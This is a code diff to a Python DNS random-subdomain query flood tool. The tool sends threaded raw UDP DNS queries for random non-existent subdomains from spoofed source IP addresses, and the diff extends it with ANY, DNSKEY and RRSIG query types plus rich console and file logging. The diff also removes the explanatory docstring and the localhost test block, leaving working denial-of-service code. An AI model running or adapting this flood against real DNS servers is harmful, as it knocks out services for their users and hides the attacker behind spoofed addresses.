@@ -6,6 +6,10 @@ import random
 import time
 import threading
 import string
+import logging
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
 
 current_dir = os.path.dirname(os.path.abspath(__file__))
 if current_dir not in sys.path:
@@ -133,30 +137,22 @@ SUBDOMAIN GENERATION PATTERNS:
 - Ensures cache misses and processing overhead
 
 """
+console = Console()
+
+dns_query_type_dict = {
+    5: "CNAME",
+    2: "NS",
+    15: "MX",
+    16: "TXT",
+    46: "RRSIG",
+    48: "DNSKEY",
+    255: "ANY",
+}
 
 
 class DNSRandomSubdomainQueryFlood(AttackStrategy):
     """
     DNS Random Subdomain Query Flood Attack with IP Spoofing.
-
-    This attack overwhelms DNS servers by generating massive amounts of queries
-    for random, non-existent subdomains, forcing cache misses and expensive
-    processing while using IP spoofing to evade detection.
-
-    KEY ATTACK FEATURES:
-    - Generates random subdomains to ensure cache misses
-    - Uses IP spoofing to appear as requests from different sources
-    - Bypasses rate limiting based on source IP addresses
-    - Forces DNS server to perform expensive recursive lookups
-    - Overwhelms DNS cache and processing resources
-
-    ATTACK MECHANISM:
-    1. Generate random spoofed source IP address
-    2. Create random subdomain query (e.g., abc123.example.com)
-    3. Build DNS query packet with proper encoding
-    4. Send raw UDP packet with spoofed source
-    5. DNS server must process query and perform lookup
-    6. Repeat with different spoofed IPs and random subdomains
     """
 
     def __init__(
@@ -167,10 +163,10 @@ class DNSRandomSubdomainQueryFlood(AttackStrategy):
         threads=20,
         base_domains=None,
         query_types=None,
+        log_file=None,
     ):
         super().__init__(target_ip, target_port, duration, threads)
 
-        # DNS-specific configuration
         self.base_domains = base_domains or [
             "example.com",
             "google.com",
@@ -183,18 +179,33 @@ class DNSRandomSubdomainQueryFlood(AttackStrategy):
         ]
 
         self.query_types = query_types or [
-            1,  # A record (IPv4)
-            28,  # AAAA record (IPv6)
-            15,  # MX record (Mail Exchange)
-            5,  # CNAME record (Canonical Name)
-            2,  # NS record (Name Server)
-            16,  # TXT record (Text)
+            15,  # MX
+            5,  # CNAME
+            2,  # NS
+            16,  # TXT
+            46,  # RRSIG
+            48,  # DNSKEY
+            255,  # ANY
         ]
 
-        # Character sets for random subdomain generation
         self.subdomain_chars = string.ascii_lowercase + string.digits
         self.subdomain_min_length = 8
         self.subdomain_max_length = 15
+
+        # Setup file logger (decoupled from console logger)
+        log_path = log_file if log_file else "./dns_random_subdomain_query_flood.log"
+        self.file_logger = logging.getLogger("DNS_RANDOM_SUBDOMAIN_FILE")
+        self.file_logger.setLevel(logging.INFO)
+        # Only add handler if not already present (avoid duplicate logs)
+        if not self.file_logger.handlers:
+            fh = logging.FileHandler(log_path)
+            fh.setFormatter(
+                logging.Formatter(
+                    "[%(asctime)s] %(name)s - %(levelname)s - %(message)s"
+                )
+            )
+            self.file_logger.addHandler(fh)
+        self.file_logger.propagate = False
 
     def _generate_random_subdomain(self):
         """Generate a random subdomain string."""
@@ -216,7 +227,8 @@ class DNSRandomSubdomainQueryFlood(AttackStrategy):
             subdomain2 = self._generate_random_subdomain()
             domain = f"{subdomain1}.{subdomain2}.{base_domain}"
 
-        self.logger.debug(f"Generated random domain: {domain}")
+        # self.logger.debug(f"Generated random domain: {domain}")
+        # Optionally log to file_logger at debug/info level if needed
         return domain
 
     def _encode_domain_name(self, domain):
@@ -269,15 +281,15 @@ class DNSRandomSubdomainQueryFlood(AttackStrategy):
 
     def _create_dns_query_packet(self, domain, qtype=1):
         """Create complete DNS query packet."""
-        dns_header, transaction_id = self._create_dns_header()
+        dns_header, _transaction_id = self._create_dns_header()
         dns_question = self._create_dns_question(domain, qtype)
 
         dns_packet = dns_header + dns_question
 
-        self.logger.debug(
-            f"Created DNS query for {domain} (type {qtype}), "
-            f"packet size: {len(dns_packet)} bytes, TXN ID: {transaction_id}"
-        )
+        # self.logger.debug(
+        #     f"Created DNS query for {domain} (type {qtype}), "
+        #     f"packet size: {len(dns_packet)} bytes, TXN ID: {transaction_id}"
+        # )
 
         return dns_packet
 
@@ -377,13 +389,22 @@ class DNSRandomSubdomainQueryFlood(AttackStrategy):
             sock.close()
 
             self.packets_sent += 1
-            self.logger.debug(
-                f"Sent DNS query for {domain} from spoofed {source_ip}:{source_port}"
-            )
+            req_info = {
+                "timestamp": time.time(),
+                "query_name": domain,
+                "query_type": qtype,
+                "spoofed_ip": source_ip,
+                "spoofed_port": source_port,
+            }
+            self.metrics["dns_requests"].append(req_info)
+            msg = f"Sent DNS query: {domain} (type {dns_query_type_dict.get(qtype, qtype)}) from {source_ip}:{source_port}"
+            self.file_logger.info(msg)
             return True
 
         except Exception as e:
-            self.logger.error(f"Error sending DNS query: {e}")
+            err_msg = f"Error sending DNS query: {e}"
+            console.print(f"[red]{err_msg}[/red]")
+            self.file_logger.error(err_msg)
             return False
 
     def _check_privileges(self):
@@ -405,7 +426,6 @@ class DNSRandomSubdomainQueryFlood(AttackStrategy):
     def _dns_flood_worker(self):
         """Worker thread for sending DNS queries with IP spoofing."""
         thread_id = threading.current_thread().ident
-        self.logger.debug(f"DNS flood worker thread {thread_id} started")
 
         while self.attack_active:
             try:
@@ -417,26 +437,17 @@ class DNSRandomSubdomainQueryFlood(AttackStrategy):
                 domain = self._generate_random_domain()
                 qtype = random.choice(self.query_types)
 
-                self.logger.debug(
-                    f"Thread {thread_id}: Querying {domain} (type {qtype}) "
-                    f"from spoofed {source_ip}:{source_port}"
-                )
-
                 # Send DNS query
-                success = self._send_dns_query(source_ip, source_port, domain, qtype)
-
-                if success:
-                    self.logger.debug(f"Successfully sent query for {domain}")
+                self._send_dns_query(source_ip, source_port, domain, qtype)
 
                 # Small delay to prevent overwhelming the system
                 time.sleep(0.01)
 
             except Exception as e:
-                error_msg = f"Error in DNS flood worker thread {thread_id}: {e}"
-                self.logger.error(error_msg)
+                err_msg = f"Error in DNS flood worker thread {thread_id}: {e}"
+                console.print(f"[red]{err_msg}[/red]")
+                self.file_logger.error(err_msg)
                 continue
-
-        self.logger.debug(f"DNS flood worker thread {thread_id} stopped")
 
     def _monitor_attack_progress(self, start_time):
         """Monitor and display DNS attack progress."""
@@ -445,85 +456,170 @@ class DNSRandomSubdomainQueryFlood(AttackStrategy):
                 elapsed = time.time() - start_time
                 rate = self.packets_sent / elapsed if elapsed > 0 else 0
 
-                rate_color = self._get_rate_color(rate)
+                if rate < 100:
+                    level = "[green]LOW[/green]"
+                elif rate < 1000:
+                    level = "[yellow]MEDIUM[/yellow]"
+                else:
+                    level = "[red]HIGH[/red]"
 
-                progress_msg = f"Elapsed: {elapsed:.1f}s | DNS Queries: {self.packets_sent} | Rate: {rate:.1f} qps"
-                self._print_colored(f"\r{progress_msg}", rate_color, end="")
-
-                if int(elapsed) % 10 == 0 and int(elapsed) > 0:
-                    self.logger.info(f"DNS flood attack progress - {progress_msg}")
-
+                progress_msg = (
+                    f"Rate: {rate:.1f} qps [{level}] | "
+                    f"Total sent: [bold cyan]{self.packets_sent:,}[/bold cyan] | "
+                    f"Elapsed: [yellow]{elapsed:.1f}s[/yellow]"
+                )
+                console.print(f"\r{progress_msg}", end="\r")
                 time.sleep(1)
         except KeyboardInterrupt:
-            self._print_warning("\nDNS flood attack interrupted by user")
-            self.logger.warning("DNS flood attack interrupted by user")
+            console.print(
+                "\n[yellow]🛑 DNS random subdomain query flood attack interrupted by user[/yellow]"
+            )
+            self.file_logger.warning(
+                "DNS random subdomain query flood attack interrupted by user"
+            )
+
+    def log_dns_request_stats(self):
+        requests = self.metrics.get("dns_requests", [])
+        total = len(requests)
+        if total == 0:
+            self.file_logger.info("DNS_REQUEST_STATS - No DNS requests recorded.")
+            return
+
+        domain_counts = {}
+        type_counts = {}
+        for req in requests:
+            domain = req.get("query_name")
+            qtype = req.get("query_type")
+            domain_counts[domain] = domain_counts.get(domain, 0) + 1
+            type_counts[qtype] = type_counts.get(qtype, 0) + 1
+
+        unique_domains = len(domain_counts)
+        unique_types = len(type_counts)
+        top_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[
+            :5
+        ]
+        top_types = sorted(type_counts.items(), key=lambda x: x[1], reverse=True)
+
+        self.file_logger.info(f"DNS_REQUEST_STATS - Total requests: {total}")
+        self.file_logger.info(f"DNS_REQUEST_STATS - Unique domains: {unique_domains}")
+        self.file_logger.info(f"DNS_REQUEST_STATS - Unique query types: {unique_types}")
+        self.file_logger.info(
+            f"DNS_REQUEST_STATS - Top 5 queried domains: {top_domains}"
+        )
+        self.file_logger.info(
+            f"DNS_REQUEST_STATS - Query type counts: {[(dns_query_type_dict.get(t, t), c) for t, c in top_types]}"
+        )
 
     def attack(self):
         """Execute the DNS Random Subdomain Query Flood attack with IP spoofing."""
-        self._display_attack_header()
-
-        self.logger.info(
-            f"Starting DNS Random Subdomain Query Flood attack on {self.target_ip}:{self.target_port}"
-        )
-        self.logger.info(
-            f"Attack parameters - Duration: {self.duration}s, Threads: {self.threads}"
-        )
-        self.logger.info(
-            f"Base domains: {len(self.base_domains)}, Query types: {len(self.query_types)}"
-        )
-        self.logger.info(
-            "IP SPOOFING ENABLED: Using random source IP addresses for each query"
-        )
-
+        self._print_attack_header()
+        self._log_attack_parameters()
         if not self._check_privileges():
             return
 
         self.attack_active = True
         start_time = time.time()
-
-        self._print_header("Starting DNS flood attack threads...")
-        self._print_info("🎭 IP Spoofing: Each query uses a random source IP address")
-        self._print_info(
-            "🎲 Random Subdomains: Generating non-existent subdomains for cache misses"
-        )
-        self._print_info(
-            "💥 Query Types: Mixed A, AAAA, MX, CNAME, NS, and TXT queries"
-        )
-        self._print_info("🔄 Cache Bypass: Random subdomains ensure no cache hits")
-
-        self.logger.info(
-            f"Starting {self.threads} DNS flood worker threads with IP spoofing"
-        )
+        self.metrics["start_time"] = start_time
 
         threads = self._start_worker_threads()
-
-        self._print_success(f"✓ {self.threads} DNS flood worker threads started")
-        self._print_info(
-            "DNS Random Subdomain Query Flood in progress... Press Ctrl+C to stop"
-        )
+        self._print_worker_threads_started()
+        self._print_attack_in_progress()
 
         self._monitor_attack_progress(start_time)
-
         self.attack_active = False
-        self._print_info("\nStopping DNS flood attack threads...")
 
+        self._stop_worker_threads(threads)
+        end_time = time.time()
+        self._summarize_attack(start_time, end_time)
+        self.log_dns_request_stats()
+
+    def _print_attack_header(self):
+        header_text = (
+            f"[bold red]DNS RANDOM SUBDOMAIN QUERY FLOOD INITIATED[/bold red]\n"
+            f"[bold white]Target:[/bold white] [yellow]{self.target_ip}:{self.target_port}[/yellow]\n"
+            f"[bold white]Duration:[/bold white] [yellow]{self.duration} seconds[/yellow]\n"
+            f"[bold white]Threads:[/bold white] [yellow]{self.threads}[/yellow]"
+        )
+        console.print(
+            Panel.fit(
+                header_text,
+                title="DNS Random Subdomain Query Flood",
+                border_style="magenta",
+            )
+        )
+
+    def _log_attack_parameters(self):
+        self.file_logger.info(
+            f"Attack parameters - Duration: {self.duration}s, Threads: {self.threads}"
+        )
+        self.file_logger.info(
+            f"Base domains: {len(self.base_domains)}, Query types: {len(self.query_types)}"
+        )
+        self.file_logger.info(
+            "IP SPOOFING ENABLED: Using random source IP addresses for each query"
+        )
+
+    def _print_worker_threads_started(self):
+        console.print(
+            f"[bold green]✓ {self.threads} DNS random subdomain flood worker threads started[/bold green]"
+        )
+
+    def _print_attack_in_progress(self):
+        console.print(
+            "[blue]DNS Random Subdomain Query Flood in progress... Press Ctrl+C to stop[/blue]"
+        )
+
+    def _stop_worker_threads(self, threads):
+        console.print(
+            "\n[bold red]Stopping DNS random subdomain query flood attack threads...[/bold red]"
+        )
         for thread in threads:
             thread.join(timeout=1)
 
-        self._display_attack_completion(start_time)
+    def _summarize_attack(self, start_time, end_time):
+        duration_sec = end_time - start_time
+        total_packets = self.packets_sent
+        avg_rate = total_packets / duration_sec if duration_sec > 0 else 0
 
+        self.metrics["end_time"] = end_time
+        self.metrics["total_packets"] = total_packets
+        self.metrics["avg_rate"] = avg_rate
 
-if __name__ == "__main__":
-    import logging
+        if total_packets >= 10000:
+            packet_color = "green"
+        elif total_packets >= 1000:
+            packet_color = "yellow"
+        else:
+            packet_color = "red"
+        if avg_rate >= 1000:
+            rate_color = "green"
+        elif avg_rate >= 100:
+            rate_color = "yellow"
+        else:
+            rate_color = "red"
 
-    logging.basicConfig(
-        level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
-    )
+        summary_table = Table.grid(padding=(0, 2))
+        summary_table.add_column(justify="left")
+        summary_table.add_column(justify="right")
+        summary_table.add_row(
+            "[bold white]📦 Total Packets Sent[/bold white]",
+            f"[{packet_color}]{total_packets:,}[/{packet_color}]",
+        )
+        summary_table.add_row(
+            "[bold white]⏱️  Duration[/bold white]",
+            f"[cyan]{duration_sec:.2f} seconds[/cyan]",
+        )
+        summary_table.add_row(
+            "[bold white]🚀 Average Rate[/bold white]",
+            f"[{rate_color}]{avg_rate:.2f} packets/sec[/{rate_color}]",
+        )
 
-    target_ip = "127.0.0.1"  # Localhost for testing
-    target_port = 53  # DNS port
-
-    attack = DNSRandomSubdomainQueryFlood(
-        target_ip, target_port, duration=10, threads=5
-    )
-    attack.attack()
+        summary_panel = Panel.fit(
+            summary_table,
+            title="[bold green]DNS RANDOM SUBDOMAIN QUERY FLOOD COMPLETED[/bold green]",
+            border_style="cyan",
+        )
+        console.print(summary_panel)
+        self.file_logger.info(
+            f"Attack completed. Packets: {total_packets}, Time: {duration_sec:.2f}s, Rate: {avg_rate:.2f} pps"
+        )
